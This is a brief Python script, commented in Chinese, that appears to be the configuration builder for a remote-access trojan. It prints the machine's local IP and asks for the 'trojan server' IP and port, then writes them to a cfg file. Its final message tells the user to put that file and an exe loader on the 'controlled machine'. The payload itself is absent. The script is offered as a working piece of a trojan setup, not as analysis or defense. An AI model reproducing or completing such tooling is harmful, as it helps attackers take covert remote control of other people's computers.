 
import socket
import os

# 获取本机ip地址
def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
    finally:
        s.close()
    return ip

# 打印本机ip地址
print("本机ip地址为：", get_local_ip())

# 询问用户木马服务器ip和服务器端口
server_ip = input("输入服务器ip地址:")
server_port = input("输入服务器端口：")

# 将用户输入的值放入cfg文件中
with open("cfg", "w") as f:
    f.write(server_ip + "\n" + server_port)


print("cfg文件生成成功！\n运行服务端后将cfg文件与exe加载器放入被控机同一目录下运行")